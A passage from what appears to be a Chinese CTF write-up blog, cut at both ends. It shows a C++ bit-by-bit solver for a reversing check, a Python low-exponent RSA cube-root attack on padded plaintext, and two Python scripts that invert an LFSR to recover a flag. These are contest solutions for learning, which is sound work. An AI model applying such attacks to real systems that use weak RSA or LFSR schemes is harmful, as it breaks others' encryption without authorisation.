&amp;= <span class=\"number\">0xE76EDA24</span>;</span><br><span class=\"line\">\tedx = eax;</span><br><span class=\"line\">\teax = edx;</span><br><span class=\"line\">\teax += eax;</span><br><span class=\"line\">\teax += edx;</span><br><span class=\"line\">\teax += eax;</span><br><span class=\"line\"></span><br><span class=\"line\">\tesi  = eax;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax |= <span class=\"number\">0xE76EDA24</span>;</span><br><span class=\"line\">\teax = eax;</span><br><span class=\"line\">\teax = ~eax;</span><br><span class=\"line\">\tedx = eax;</span><br><span class=\"line\">\teax = edx;</span><br><span class=\"line\">\teax += eax;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\teax += edx;</span><br><span class=\"line\">\teax &lt;&lt;= <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\teax += esi;</span><br><span class=\"line\">\tecx -= eax;</span><br><span class=\"line\">\tedx = x;</span><br><span class=\"line\">\teax = edx;</span><br><span class=\"line\">\teax &lt;&lt;= <span class=\"number\">2</span>;</span><br><span class=\"line\">\teax += edx;</span><br><span class=\"line\">\teax = -eax;</span><br><span class=\"line\">\tedx = x;</span><br><span class=\"line\">\tedx |= <span class=\"number\">0xCD731B78</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tedx = edx;</span><br><span class=\"line\">\tedx = ~edx;</span><br><span class=\"line\">\tedx += edx;</span><br><span class=\"line\">\teax -= edx;</span><br><span class=\"line\">\tedx = eax;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax |= <span class=\"number\">0x328CE487</span>;</span><br><span class=\"line\">\tesi = edx;</span><br><span class=\"line\">\tesi -= eax;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax &amp;= <span class=\"number\">0xCD731B78</span>;</span><br><span class=\"line\">\tedx = eax;</span><br><span class=\"line\">\teax = edx;</span><br><span class=\"line\">\teax += eax;</span><br><span class=\"line\">\teax += edx;</span><br><span class=\"line\">\tedx = esi+eax;</span><br><span class=\"line\">\t<span class=\"comment\">//std::cout&lt;&lt;std::hex&lt;&lt;eax&lt;&lt;&quot; &quot;&lt;&lt;edx&lt;&lt;&quot; &quot;&lt;&lt;ecx&lt;&lt;&quot; &quot;&lt;&lt;esi&lt;&lt;&quot; &quot;&lt;&lt;edi&lt;&lt;std::endl;</span></span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\trsi = <span class=\"number\">0xFFFFFFFF328CE487</span>;</span><br><span class=\"line\">\trax |= eax;</span><br><span class=\"line\">\trsi |= rax;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\trax = x;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\trdi = <span class=\"number\">0xFFFFFFFF328CE487</span>;</span><br><span class=\"line\">\trax |= eax;</span><br><span class=\"line\">\trdi &amp;= rax;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\teax = <span class=\"number\">0</span>;</span><br><span class=\"line\">\trax = <span class=\"number\">0</span>;</span><br><span class=\"line\">\trax -=rdi;</span><br><span class=\"line\">\trax += rax;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\trsi -= rax;</span><br><span class=\"line\">\trax = rsi;</span><br><span class=\"line\">\tesi = rsi &amp; <span class=\"number\">0xFFFFFFFF</span>;</span><br><span class=\"line\">\teax = rax &amp; <span class=\"number\">0xFFFFFFFF</span>;</span><br><span class=\"line\">\tesi = eax;</span><br><span class=\"line\">\teax = <span class=\"number\">0</span>;</span><br><span class=\"line\">\teax -= esi;</span><br><span class=\"line\">\teax += eax;</span><br><span class=\"line\">\tedx -= eax;</span><br><span class=\"line\">\teax = edx;</span><br><span class=\"line\">\teax += ecx;</span><br><span class=\"line\">\teax += <span class=\"number\">0x189125DA</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//std::cout&lt;&lt;std::hex&lt;&lt;eax&lt;&lt;&quot; &quot;&lt;&lt;edx&lt;&lt;&quot; &quot;&lt;&lt;ecx&lt;&lt;&quot; &quot;&lt;&lt;esi&lt;&lt;&quot; &quot;&lt;&lt;edi&lt;&lt;std::endl;</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (eax &amp; (<span class=\"number\">1</span>&lt;&lt;i)) == (ans &amp; (<span class=\"number\">1</span>&lt;&lt;i));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">checker4</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//69863554</span></span><br><span class=\"line\">\tstd::stack&lt;<span class=\"type\">int</span>&gt; try_stack;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> x = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span> ;i &lt; <span class=\"number\">32</span> ;i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">bool</span> use0 = <span class=\"built_in\">checker4_check</span>(x,i);</span><br><span class=\"line\">\t\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> xx = x | (<span class=\"number\">1</span>&lt;&lt;i);</span><br><span class=\"line\">\t\t<span class=\"type\">bool</span> use1 = <span class=\"built_in\">checker4_check</span>(xx,i);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(use0 &amp; !use1)&#123;</span><br><span class=\"line\">\t\t\tstd::cout&lt;&lt;i&lt;&lt;<span class=\"string\">&quot;:0&quot;</span>&lt;&lt;std::endl;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(use1 &amp; !use0)&#123;</span><br><span class=\"line\">\t\t\tx = xx;</span><br><span class=\"line\">\t\t\tstd::cout&lt;&lt;i&lt;&lt;<span class=\"string\">&quot;:1&quot;</span>&lt;&lt;std::endl;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(use1 &amp;&amp; use0)&#123;</span><br><span class=\"line\">\t\t\ttry_stack.<span class=\"built_in\">push</span>(i);</span><br><span class=\"line\">\t\t\tstd::cout&lt;&lt;i&lt;&lt;<span class=\"string\">&quot;:both,choose 0&quot;</span>&lt;&lt;std::endl;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;<span class=\"comment\">// first try 0</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tstd::cout&lt;&lt;i&lt;&lt;<span class=\"string\">&quot; cant choose &quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!try_stack.<span class=\"built_in\">empty</span>())&#123;</span><br><span class=\"line\">\t\t\ti = try_stack.<span class=\"built_in\">top</span>();</span><br><span class=\"line\">\t\t\tstd::cout&lt;&lt;<span class=\"string\">&quot;return to&quot;</span>&lt;&lt;i&lt;&lt;<span class=\"string\">&quot;:1&quot;</span>&lt;&lt;std::endl;</span><br><span class=\"line\">\t\t\ttry_stack.<span class=\"built_in\">pop</span>();</span><br><span class=\"line\">\t\t\tx &amp;=  ~((~<span class=\"number\">0</span>)&lt;&lt;i);</span><br><span class=\"line\">\t\t\tx |= (<span class=\"number\">1</span>&lt;&lt;i);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;\t</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tstd::cout&lt;&lt;x&lt;&lt;<span class=\"string\">&quot; wrong&quot;</span>&lt;&lt;std::endl;</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tstd::cout&lt;&lt;x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">checker4</span>();</span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\tif(checker4_check(0b000010,4))&#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\tstd::cout&lt;&lt;&quot;correct&quot;;</span></span><br><span class=\"line\"><span class=\"comment\">\t&#125;else&#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\tstd::cout&lt;&lt;&quot;wrong&quot;;</span></span><br><span class=\"line\"><span class=\"comment\">\t&#125;*/</span></span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>做完发现其实可以F5直接看反汇编 用C语言的逻辑运算来判断更简单</p>\n<h2 id=\"CRYPTO\"><a href=\"#CRYPTO\" class=\"headerlink\" title=\"CRYPTO\"></a>CRYPTO</h2><h3 id=\"Baby-RSA\"><a href=\"#Baby-RSA\" class=\"headerlink\" title=\"Baby RSA\"></a>Baby RSA</h3><p>明文转换后长度很短 可以直接低指数加密攻击 开方<br>这里末尾补0相当于乘2的n次方 底数还是单项式 可以左右同乘逆来使得左边恢复到较小的明文 然后开方</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">from</span> functools <span class=\"keyword\">import</span> reduce </span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes,getPrime</span><br><span class=\"line\"><span class=\"keyword\">from</span> math <span class=\"keyword\">import</span> log</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">baby_rsa</span>():</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    flag b&#x27;ab&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    pad  b&#x27;ab\\x00\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    hex  b&#x27;61 62 00 00&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    int 0x6162 * 2**16</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    x = pad*8</span></span><br><span class=\"line\"><span class=\"string\">    (m*2**x)**e mod n = c</span></span><br><span class=\"line\"><span class=\"string\">    m**e * 2**xe mod n = c</span></span><br><span class=\"line\"><span class=\"string\">    m**e mod n = c * (2**ex)-1</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    N=<span class=\"number\">16530365897488441262718469160468305284672770158565384656092954623166151666302358404933519039638206427781958395014977873069315249917687177391054598956921816589982653878314268070746187225652226338489804977785763153836685700798637491040895954952095422949071944941698464075339538328682378899518357259255186771307748930179001187349761726049249957165990922342916419869650553300100675697071325624717861450136979864203856665171732760034460573404619831815041691417998362001038634540263831565785650815875836418726271391989975051958347165191015489214380435520924596097210274112756495171085840647510675017795358896351877011292749</span></span><br><span class=\"line\">    c=<span class=\"number\">1649242716162425826952050775303626268696750298411662319537259424228876945404220528279665292763881515080700349538084002211268837126748044168226799293579149622927076423346431814176280309043104500742869900600491670771220025075170550107937095925147470540522377810395335659166311121764537896320094910974901416858921029589127145477064557304982115657845643933262558300020611395670651783198790515650255634160032636409647553580657649111930945938237122361584298948645275748211120347592403311681019560483613600396814929463355821651618347651685517027239330376660444812896525930403439089808046524555500501484453485168927363278214</span></span><br><span class=\"line\">    e=<span class=\"number\">3</span></span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    def pad(m):</span></span><br><span class=\"line\"><span class=\"string\">        return m + b&#x27;\\x00&#x27; * (255 - len(m))</span></span><br><span class=\"line\"><span class=\"string\">    flag = b&#x27;0ops&#123;123&#125;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    p = 111345042336617079395655969248384725462942989722982708986115750759582884327143846096591193086377487304656518041676837325011033537087510526817704471697404176187078871161470888545207754020019021746157064253305053303512621476201052191949956657153110512813676935622000049248802125683401544972238560398010672992601</span></span><br><span class=\"line\"><span class=\"string\">    q = 153271507501132502258967640136039635283134834243664743747270391389487283488801676850443858493501493587201641571605287451116678489374548421733711540807596096746696511663395091514758222006766300592141141966606374343902616443452703301934074963209880423996150731879969146868471922084764152939831612389213674285053</span></span><br><span class=\"line\"><span class=\"string\">    print(p,q)</span></span><br><span class=\"line\"><span class=\"string\">    n = p * q</span></span><br><span class=\"line\"><span class=\"string\">    N = n</span></span><br><span class=\"line\"><span class=\"string\">    m=int(flag.hex(), 16)</span></span><br><span class=\"line\"><span class=\"string\">    print(int(flag.hex(), 16)*2**((255-len(flag))*8))</span></span><br><span class=\"line\"><span class=\"string\">    print(int(pad(flag).hex(), 16))</span></span><br><span class=\"line\"><span class=\"string\">    ct = pow(int(pad(flag).hex(), 16), e, n)</span></span><br><span class=\"line\"><span class=\"string\">    c = ct</span></span><br><span class=\"line\"><span class=\"string\">    print(&#x27;c:&#x27;,c)</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> flag_length <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>,<span class=\"number\">40</span>):</span><br><span class=\"line\">        <span class=\"comment\">#if flag_length!=len(flag):</span></span><br><span class=\"line\">            <span class=\"comment\">#continue</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(flag_length)</span><br><span class=\"line\">        pad = <span class=\"number\">255</span>-flag_length</span><br><span class=\"line\">        t = e*pad*<span class=\"number\">8</span></span><br><span class=\"line\">        <span class=\"comment\">#print(2**t)</span></span><br><span class=\"line\">        inv = gmpy2.invert(<span class=\"number\">2</span>**t,N)</span><br><span class=\"line\">        <span class=\"comment\">#print(inv*2**t%N)</span></span><br><span class=\"line\">        m3 = c*inv%N</span><br><span class=\"line\">        m,flag = gmpy2.iroot(gmpy2.mpz(m3),e)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> flag:</span><br><span class=\"line\">              <span class=\"built_in\">print</span>(long_to_bytes(m.digits()))</span><br><span class=\"line\">              <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"RSFL\"><a href=\"#RSFL\" class=\"headerlink\" title=\"RSFL\"></a>RSFL</h3><p>数据每次向左移一位 右边补一位为：</p>\n<ul>\n<li>若二进制表示中1个数为奇数 补1</li>\n<li>若二进制表示中1个数为偶数 补0</li>\n</ul>\n<p>左边移出的信息通过右边补的体现了 lsb通过tmp给出 可以复原<br>第一种</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#from secret import flag</span></span><br><span class=\"line\">flag = <span class=\"string\">b&quot;0ops&#123;flagtestflagtestflagtestaa&#125;&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(flag))</span><br><span class=\"line\">mask = <span class=\"number\">0x9e393e7126c18da37dc14f9a3113c50c8ad4a522ae4501b20531</span></span><br><span class=\"line\"><span class=\"comment\">#mask =  0xffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\">limit = <span class=\"number\">0xffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\">ri = []</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">LFSR</span>(<span class=\"params\"><span class=\"built_in\">input</span></span>):</span><br><span class=\"line\">\toutput = (<span class=\"built_in\">input</span> &lt;&lt; <span class=\"number\">1</span>) &amp; limit</span><br><span class=\"line\">\ti = (<span class=\"built_in\">input</span> &amp; mask) &amp; limit</span><br><span class=\"line\">\ta = <span class=\"built_in\">list</span>(<span class=\"built_in\">bin</span>(i))<span class=\"comment\">#二进制表示1的位数是奇数</span></span><br><span class=\"line\">\tb = a.count(<span class=\"string\">&#x27;1&#x27;</span>) % <span class=\"number\">2</span></span><br><span class=\"line\">\tlsb = <span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> i != <span class=\"number\">0</span>:</span><br><span class=\"line\">\t\tlsb ^= (i &amp; <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\ti = i &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\">\t<span class=\"keyword\">assert</span> lsb == b</span><br><span class=\"line\">\t<span class=\"comment\">#print(bin(output)[:10])</span></span><br><span class=\"line\">\toutput ^= lsb</span><br><span class=\"line\">\t<span class=\"comment\">#print(lsb,end=&#x27;&#x27;)</span></span><br><span class=\"line\">\t<span class=\"comment\">#print(bin(output)[:10])</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (output, lsb)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">assert</span> <span class=\"built_in\">len</span>(flag) == <span class=\"number\">32</span></span><br><span class=\"line\">R = <span class=\"built_in\">int</span>.from_bytes(flag[<span class=\"number\">5</span>: -<span class=\"number\">1</span>], <span class=\"string\">&#x27;big&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;R:&#x27;</span>,R)</span><br><span class=\"line\"><span class=\"comment\">#print(int.to_bytes(R,28,&#x27;big&#x27;))</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;R:&#x27;</span>,<span class=\"built_in\">bin</span>(R))</span><br><span class=\"line\">tmp = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">208</span>):</span><br><span class=\"line\">    (R, lsb) = LFSR(R)</span><br><span class=\"line\">    tmp = (tmp &lt;&lt; <span class=\"number\">1</span>) | lsb</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    if i in [204,205,206]:</span></span><br><span class=\"line\"><span class=\"string\">        print(i,bin(R),len(bin(R))-2)</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(R)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(tmp)</span><br><span class=\"line\"><span class=\"comment\">#R=tmp</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#lsb只改变填充的最后一位 不改变原先的bit</span></span><br><span class=\"line\"><span class=\"comment\">#已知tmp是lsb 可以从第一位就开始恢复 恢复207位 然后恢复真实数据</span></span><br><span class=\"line\">tmp = <span class=\"number\">0xc9fe198703d93a7cff319d81c311b169de4b8d528d2dbec4859b</span></span><br><span class=\"line\">r = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">207</span>):</span><br><span class=\"line\">    r &lt;&lt;= <span class=\"number\">1</span></span><br><span class=\"line\">    lsb = (tmp &gt;&gt; (<span class=\"number\">207</span>-i))&amp;<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"comment\">#print(lsb,end=&#x27;&#x27;)</span></span><br><span class=\"line\">    r ^= lsb</span><br><span class=\"line\"><span class=\"comment\"># 这里得到的r是R207的最后207位</span></span><br><span class=\"line\"><span class=\"comment\"># tmp &amp; 1为R207&amp;mask 二进制中1个数的奇偶</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">n = r</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">207</span>):</span><br><span class=\"line\">    n |= ((<span class=\"built_in\">list</span>(<span class=\"built_in\">bin</span>(n &amp; mask)).count(<span class=\"string\">&#x27;1&#x27;</span>)%<span class=\"number\">2</span>) ^ ((tmp&gt;&gt;i) &amp; <span class=\"number\">1</span>)) &lt;&lt; <span class=\"number\">207</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#print(bin(n))</span></span><br><span class=\"line\"></span><br><span class=\"line\">    n &gt;&gt;= <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">m1 = <span class=\"built_in\">int</span>.to_bytes(n,<span class=\"number\">28</span>,<span class=\"string\">&#x27;big&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(m1)</span><br><span class=\"line\">m2 = <span class=\"built_in\">int</span>.to_bytes(n + (<span class=\"number\">1</span>&lt;&lt;<span class=\"number\">207</span>),<span class=\"number\">28</span>,<span class=\"string\">&#x27;big&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(m2)</span><br><span class=\"line\"><span class=\"comment\">#reverse_an_LFSR_is_so_easy</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>第二种</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python3</span></span><br><span class=\"line\"><span class=\"comment\">#from secret import flag</span></span><br><span class=\"line\">flag = <span class=\"string\">b&quot;0ops&#123;flagtestflagtestflagtestaa&#125;&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(flag))</span><br><span class=\"line\">mask = <span class=\"number\">0x9e393e7126c18da37dc14f9a3113c50c8ad4a522ae4501b20531</span></span><br><span class=\"line\"><span class=\"comment\">#mask =  0xffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\">limit = <span class=\"number\">0xffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\">ri = []</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">LFSR</span>(<span class=\"params\"><span class=\"built_in\">input</span></span>):</span><br><span class=\"line\">        output = (<span class=\"built_in\">input</span> &lt;&lt; <span class=\"number\">1</span>) &amp; limit</span><br><span class=\"line\">        i = (<span class=\"built_in\">input</span> &amp; mask) &amp; limit</span><br><span class=\"line\">        a = <span class=\"built_in\">list</span>(<span class=\"built_in\">bin</span>(i))<span class=\"comment\">#二进制表示1的位数是奇数</span></span><br><span class=\"line\">        b = a.count(<span class=\"string\">&#x27;1&#x27;</span>) % <span class=\"number\">2</span></span><br><span class=\"line\">        lsb = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> i != <span class=\"number\">0</span>:</span><br><span class=\"line\">                lsb ^= (i &amp; <span class=\"number\">1</span>)</span><br><span class=\"line\">                i = i &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">assert</span> lsb == b</span><br><span class=\"line\">        <span class=\"comment\">#print(bin(output)[:10])</span></span><br><span class=\"line\">        output ^= lsb</span><br><span class=\"line\">        <span class=\"comment\">#print(lsb,end=&#x27;&#x27;)</span></span><br><span class=\"line\">        <span class=\"comment\">#print(bin(output)[:10])</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> (output, lsb)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">assert</span> <span class=\"built_in\">len</span>(flag) == <span class=\"number\">32</span></span><br><span class=\"line\">R = <span class=\"built_in\">int</span>.from_bytes(flag[<span class=\"number\">5</span>: -<span class=\"number\">1</span>], <span class=\"string\">&#x27;big&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;R:&#x27;</span>,R)</span><br><span class=\"line\"><span class=\"comment\">#print(int.to_bytes(R,28,&#x27;big&#x27;))</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;R:&#x27;</span>,<span class=\"built_in\">bin</span>(R))</span><br><span class=\"line\">tmp = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>*<span class=\"number\">208</span>):</span><br><span class=\"line\">    (R, lsb) = LFSR(R)</span><br><span class=\"line\">    tmp = ((tmp &lt;&lt; <span class=\"number\">1</span>) | lsb) &amp; limit</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    if i &gt;= 2*208-6:</span></span><br><span class=\"line\"><span class=\"string\">        print(len(bin(tmp)),bin(tmp)[:8],bin(tmp)[-4:],list(bin(tmp &amp; mask)).count(&#x27;1&#x27;))</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(R)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(<span class=\"built_in\">bin</span>(tmp)),<span class=\"built_in\">bin</span>(tmp)[:<span class=\"number\">8</span>])</span><br><span class=\"line\"><span class=\"comment\">#R=tmp</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>()</span><br><span class=\"line\">tmp = <span class=\"number\">0x8919055a184e6842a5136da171fed5e0dc979ef724acf19317d0</span></span><br><span class=\"line\"><span class=\"comment\">#tmp = 0xc9fe198703d93a7cff319d81c311b169de4b8d528d2dbec4859b</span></span><br><span class=\"line\">valid_list = <span class=\"string\">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789[]+=-~!@#$%^&amp;()`\\\\&quot;</span></span><br><span class=\"line\">valid_list = [<span class=\"built_in\">ord</span>(c) <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> valid_list]</span><br><span class=\"line\">N = <span class=\"number\">26</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check</span>(<span class=\"params\">s</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">len</span>(<span class=\"built_in\">list</span>(<span class=\"built_in\">filter</span>(<span class=\"keyword\">lambda</span> i:i <span class=\"keyword\">in</span> valid_list,s))) &gt;= N</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>**<span class=\"number\">208</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i % <span class=\"number\">100000</span>==<span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">    odd = tmp &amp; <span class=\"number\">1</span></span><br><span class=\"line\">    tmp = tmp &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">list</span>(<span class=\"built_in\">bin</span>(tmp &amp; mask)).count(<span class=\"string\">&#x27;1&#x27;</span>)%<span class=\"number\">2</span> == odd:</span><br><span class=\"line\">        <span class=\"comment\">#print(0)</span></span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        tmp |= <span class=\"number\">1</span> &lt;&lt; <span class=\"number\">207</span></span><br><span class=\"line\">        <span class=\"comment\">#print(1)</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> tmp ==<span class=\"number\">0x8919055a184e6842a5136da171fed5e0dc979ef724acf19317d0</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    m1 = <span class=\"built_in\">int</span>.to_bytes(tmp,<span class=\"number\">28</span>,<span class=\"string\">&#x27;big&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> check(m1):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(m1)</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./flag.txt&#x27;</span>,<span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">            f.write(<span class=\"built_in\">str</span>(m1))</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    m2 = <span class=\"built_in\">int</span>.to_bytes(tmp + (<span class=\"number\">1</span>&lt;&lt;<span class=\"number\">207</span>),<span class=\"number\">28</span>,<span class=\"string\">&#x27;big&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> check(m2):</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./flag.txt&#x27;</span>,<span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">            f.write(<span class=\"built_in\">str</span>(m2))</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(m2)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>这个本来是给rsfl+做的  不过没做出来</p>\n<h2 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h2><h3 id=\"Baby-Equation\"><a href=\"#Baby-Equation\" class=\"headerlink\" title=\"Baby Equation\"></a>Baby Equation</h3><p>检索一下 